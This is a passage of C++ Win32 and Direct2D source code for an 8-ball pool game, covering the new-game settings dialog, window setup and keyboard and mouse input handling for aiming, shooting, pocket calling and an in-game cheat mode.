            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), gameMode == HUMAN_VS_AI);
        }
        return (INT_PTR)TRUE;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
            case IDC_RADIO_2P:
            case IDC_RADIO_CPU:
            {
                bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
                // Enable/Disable AI group controls based on selection
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
                // Also enable/disable Opening Break Mode group
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), isCPU);
            }
            return (INT_PTR)TRUE;

            case IDOK:
                // Retrieve selected options and store in global variables
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                    gameMode = HUMAN_VS_AI;
                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;

                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU_BREAK) == BST_CHECKED) openingBreakMode = CPU_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_P1_BREAK) == BST_CHECKED) openingBreakMode = P1_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_FLIP_BREAK) == BST_CHECKED) openingBreakMode = FLIP_COIN_BREAK;
                }
                else {
                    gameMode = HUMAN_VS_HUMAN;
                    // openingBreakMode doesn't apply to HvsH, can leave as is or reset
                }
                SaveSettings(); // Save settings when OK is pressed
                EndDialog(hDlg, IDOK); // Close dialog, return IDOK
                return (INT_PTR)TRUE;

            case IDCANCEL: // Handle Cancel or closing the dialog
                // Optionally, could reload settings here if you want cancel to revert to previously saved state
                EndDialog(hDlg, IDCANCEL);
                return (INT_PTR)TRUE;
            }
            break; // End WM_COMMAND
        }
        return (INT_PTR)FALSE; // Default processing
    }

    // --- NEW Helper to Show Dialog ---
    void ShowNewGameDialog(HINSTANCE hInstance) {
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
            // User clicked Start, reset game with new settings
            isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
            if (isPlayer2AI) {
                switch (aiDifficulty) {
                case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
                case MEDIUM: player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
                case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
                }
            }
            else {
                player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
            }
            // Update window title
            std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
            if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
            else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
            SetWindowText(hwndMain, windowTitle.c_str());

            InitGame(); // Re-initialize game logic & board
            InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
        }
        else {
            // User cancelled dialog - maybe just resume game? Or exit?
            // For simplicity, we do nothing, game continues as it was.
            // To exit on cancel from F2, would need more complex state management.
        }
    }

    // --- NEW Reset Game Function ---
    void ResetGame(HINSTANCE hInstance) {
        // Call the helper function to show the dialog and re-init if OK clicked
        ShowNewGameDialog(hInstance);
    }

    // --- WinMain ---
    int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
        if (FAILED(CoInitialize(NULL))) {
            MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
            return -1;
        }

        // --- NEW: Load settings at startup ---
        LoadSettings();

        // --- NEW: Show configuration dialog FIRST ---
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
            // User cancelled the dialog
            CoUninitialize();
            return 0; // Exit gracefully if dialog cancelled
        }
        // Global gameMode and aiDifficulty are now set by the DialogProc

        // Set AI flag based on game mode
        isPlayer2AI = (gameMode == HUMAN_VS_AI);
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
            case MEDIUM:player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
            case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
            }
        }
        else {
            player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
        }
        // --- End of Dialog Logic ---


        WNDCLASS wc = { };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

        if (!RegisterClass(&wc)) {
            MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // --- ACTION 4: Calculate Centered Window Position ---
        const int WINDOW_WIDTH = 1000; // Define desired width
        const int WINDOW_HEIGHT = 700; // Define desired height
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int windowX = (screenWidth - WINDOW_WIDTH) / 2;
        int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

        // --- Change Window Title based on mode ---
        std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

        DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

        hwndMain = CreateWindowEx(
            0, L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/, windowTitle.c_str(), dwStyle,
            windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
            NULL, NULL, hInstance, NULL
        );

        if (!hwndMain) {
            MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // Initialize Direct2D Resources AFTER window creation
        if (FAILED(CreateDeviceResources())) {
            MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        InitGame(); // Initialize game state AFTER resources are ready & mode is set
        Sleep(500); // Allow window to fully initialize before starting the countdown //midi func
        StartMidi(hwndMain, TEXT(""BSQ.MID"")); // Replace with your MIDI filename
        //PlayGameMusic(hwndMain); //midi func

        ShowWindow(hwndMain, nCmdShow);
        UpdateWindow(hwndMain);

        if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
            MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        MSG msg = { };
        // --- Modified Main Loop ---
        // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
        // or gets reset to it via F2. The main loop runs normally once game starts.
        while (GetMessage(&msg, NULL, 0, 0)) {
            // We might need modeless dialog handling here if F2 shows dialog
            // while window is active, but DialogBoxParam is modal.
            // Let's assume F2 hides main window, shows dialog, then restarts game loop.
            // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        KillTimer(hwndMain, ID_TIMER);
        DiscardDeviceResources();
        SaveSettings(); // Save settings on exit
        CoUninitialize();

        return (int)msg.wParam;
    }

    // --- WndProc ---
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Declare cueBall pointer once at the top, used in multiple cases
        // For clarity, often better to declare within each case where needed.
        Ball* cueBall = nullptr; // Initialize to nullptr
        switch (msg) {
        case WM_CREATE:
            // Resources are now created in WinMain after CreateWindowEx
            return 0;

        case WM_PAINT:
            OnPaint();
            // Validate the entire window region after painting
            ValidateRect(hwnd, NULL);
            return 0;

        case WM_SIZE: {
            UINT width = LOWORD(lParam);
            UINT height = HIWORD(lParam);
            OnResize(width, height);
            return 0;
        }

        case WM_TIMER:
            if (wParam == ID_TIMER) {
                GameUpdate(); // Update game logic and physics
                InvalidateRect(hwnd, NULL, FALSE); // Request redraw
            }
            return 0;

            // --- NEW: Handle F2 Key for Reset ---
            // --- MODIFIED: Handle More Keys ---
        case WM_KEYDOWN:
        { // Add scope for variable declarations

            // --- FIX: Get Cue Ball pointer for this scope ---
            cueBall = GetCueBall();
            // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
            // --- End Fix ---

            // Check which player can interact via keyboard (Humans only)
            bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

            // --- F1 / F2 Keys (Always available) ---
            if (wParam == VK_F2) {
                HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
                ResetGame(hInstance); // Call reset function
                return 0; // Indicate key was processed
            }
            else if (wParam == VK_F1) {
                MessageBox(hwnd,
                    L""Direct2D-based StickPool game made in C++ from scratch (4827+ lines of code)\n"" // Update line count if needed {2764+ lines}
                    L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                    L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                    L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                    L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                    L""About This Game"", MB_OK | MB_ICONINFORMATION);
                return 0; // Indicate key was processed
            }

            // Check for 'M' key (uppercase or lowercase)
                // Toggle music with ""M""
            if (wParam == 'M' || wParam == 'm') {
                //static bool isMusicPlaying = false;
                if (isMusicPlaying) {
                    // Stop the music
                    StopMidi();
                    isMusicPlaying = false;
                }
                else {
                    // Build the MIDI file path
                    TCHAR midiPath[MAX_PATH];
                    GetModuleFileName(NULL, midiPath, MAX_PATH);
                    // Keep only the directory part
                    TCHAR* lastBackslash = _tcsrchr(midiPath, '\\');
                    if (lastBackslash != NULL) {
                        *(lastBackslash + 1) = '\0';
                    }
                    // Append the MIDI filename
                    _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID"")); // Adjust filename if needed

                    // Start playing MIDI
                    StartMidi(hwndMain, midiPath);
                    isMusicPlaying = true;
                }
            }


            // --- Player Interaction Keys (Only if allowed) ---
            if (canPlayerControl) {
                // --- Get Shift Key State ---
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
                float powerStep = 0.2f; // Power step (Adjust as needed)

                switch (wParam) {
                case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle -= angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle < 0) cueAngle += 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_RIGHT: // Rotate Cue Stick Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle += angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_UP: // Decrease Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower -= powerStep;
                        if (shotPower < 0.0f) shotPower = 0.0f;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_DOWN: // Increase Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower += powerStep;
                        if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_SPACE: // Trigger Shot
                    if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                    {
                        if (shotPower > 0.15f) { // Use same threshold as mouse
                           // Reset foul flags BEFORE applying shot
                            firstHitBallIdThisShot = -1;
                            cueHitObjectBallThisShot = false;
                            railHitAfterContact = false;

                            // Play sound & Apply Shot
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                            ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                            // Update State
                            currentGameState = SHOT_IN_PROGRESS;
                            foulCommitted = false;
                            pocketedThisTurn.clear();
                            shotPower = 0; // Reset power after shooting
                            isAiming = false; isDraggingStick = false; // Reset aiming flags
                            keyboardAimingActive = false;
                        }
                    }
                    break;

                case VK_ESCAPE: // Cancel Aim/Shot Setup
                    if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                    {
                        shotPower = 0.0f;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = false;
                        // Revert to basic turn state if not breaking
                        if (currentGameState != BREAKING) {
                            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        }
                        //if (currentPlayer == 1) calledPocketP1 = -1;
                        //else                  calledPocketP2 = -1;
                    }
                    break;

                case 'G': // Toggle Cheat Mode
                    cheatModeEnabled = !cheatModeEnabled;
                    if (cheatModeEnabled)
                        MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                    else
                        MessageBeep(MB_OK); // Play a different beep when disabling
                    break;

                default:
                    // Allow default processing for other keys if needed
                    // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
                    break;
                } // End switch(wParam) for player controls
                return 0; // Indicate player control key was processed
            } // End if(canPlayerControl)
        } // End scope for WM_KEYDOWN case
        // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
        // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
        return 0;

        case WM_MOUSEMOVE: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- NEW LOGIC: Handle Pocket Hover ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {
                int oldHover = currentlyHoveredPocket;
                currentlyHoveredPocket = -1; // Reset
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        currentlyHoveredPocket = i;
                        break;
                    }
                }
                if (oldHover != currentlyHoveredPocket) {
                    InvalidateRect(hwnd, NULL, FALSE);
                }
                // Do NOT return 0 here, allow normal mouse angle update to continue
            }
            // --- END NEW LOGIC ---


            cueBall = GetCueBall(); // Declare and get cueBall pointer

            if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
                Ball* ball = GetBallById(draggingBallId);
                if (ball) {
                    ball->x = (float)ptMouse.x;
                    ball->y = (float)ptMouse.y;
                    ball->vx = ball->vy = 0.0f;
                }
                return 0;
            }

            if (!cueBall) return 0;

            // Update Aiming Logic (Check player turn)
            if (isDraggingCueBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                    currentGameState == PRE_BREAK_PLACEMENT))
            {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                // Tentative position update
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0;
            }
            else if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                //NEW2 MOUSEBOUND CODE = START
                    /*// Clamp mouse inside table bounds during aiming
                    if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
                if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
                if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
                if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
                //NEW2 MOUSEBOUND CODE = END
                // Aiming drag updates angle and power
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                    float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                    shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                }
            }
            else if (isSettingEnglish &&
                ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
            {
                // Setting English
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
            }
            else {
                //DISABLE PERM AIMING = START
                /*// Update visual angle even when not aiming/dragging (Check player turn)
                bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                    (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                    currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

                if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
                {
                    // NEW MOUSEBOUND CODE = START
                        // Only update cue angle if mouse is inside the playable table area
                    if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                        ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                    {
                        // NEW MOUSEBOUND CODE = END
                        Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                        if (cb) {
                            float dx = (float)ptMouse.x - cb->x;
                            float dy = (float)ptMouse.y - cb->y;
                            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                        }
                    } //NEW MOUSEBOUND CODE LINE = DISABLE
                }*/
                //DISABLE PERM AIMING = END
            }
            return 0;
        } // End WM_MOUSEMOVE

        case WM_LBUTTONDOWN: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- FOOLPROOF FIX: This block implements the two-stage pocket selection ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // STAGE 1, STEP 1: Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // STAGE 1, STEP 2: Player clicked on a pocket. Update the choice.
                    // We DO NOT change the game state here. This allows re-selection.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and stay in CHOOSING_POCKET state.
                }

                // STAGE 2, STEP 1: Check if the player is clicking the cue ball to confirm.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // STAGE 2, STEP 2: A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to a generic aiming state.
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message.
                    isAiming = true; // Prepare for aiming.
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable.
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }

            /*// --- FOOLPROOF FIX: This block handles re-selectable pocket choice ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) { // Player clicked on a pocket
                    // FIX: Update the called pocket, but DO NOT change the game state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show updated arrow
                    return 0; // Consume the click and stay in CHOOSING_POCKET state
                }

                // FIX: Add new logic to CONFIRM the choice by clicking the cue ball.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to aiming, not PLAYER1_TURN
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }*/

            /*// --- handle pocket re-selection when choosing 8-ball pocket ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1)
                || (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI))
            {
                POINT pt = { LOWORD(lParam), HIWORD(lParam) };
                for (int i = 0; i < 6; ++i) {
                    float dx = pt.x - pocketPositions[i].x;
                    float dy = pt.y - pocketPositions[i].y;
                    if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                        // 1) Record the call
                        if (currentPlayer == 1) calledPocketP1 = i;
                        else                  calledPocketP2 = i;
                        // 2) Clear any prompt text
                        pocketCallMessage.clear();
                        // 3) Return to normal aiming state
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        // 4) Redraw (arrow stays because calledPocketP* >= 0)
                        InvalidateRect(hwnd, NULL, FALSE);
                        return 0; // consume click
                    }
                }
                return 0; // clicked outside ? stay in pocket?call until a valid pocket is chosen
            }*/

            // … rest of your click?to?aim logic …

            //replaced /w new code
            /*
            // --- FIX: Add this entire block at the top of WM_LBUTTONDOWN ---
    // This handles input specifically for the pocket selection state.
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // A pocket was clicked. Update the selection but STAY in the choosing state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and wait for the next action.
                }

                // If the player clicks the CUE BALL, that confirms their pocket selection.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }
            // --- END OF THE NEW BLOCK ---
            */
            //new code ends here

            if (cheatModeEnabled) {
                // Allow dragging any ball freely
                for (Ball& ball : balls) {
                    float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                    if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                        isDraggingCueBall = true;
                        draggingBallId = ball.id;
                        if (ball.id == 0) {
                            // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                            if (currentPlayer == 1)
                                currentGameState = BALL_IN_HAND_P1;
                            else if (currentPlayer == 2 && !isPlayer2AI)
                                currentGameState = BALL_IN_HAND_P2;
                        }
                        return 0;
                    }
                }
            }

            Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

            // Check which player is allowed to interact via mouse click
            bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
            // Define states where interaction is generally allowed
            bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == AIMING || currentGameState == BREAKING ||
                currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
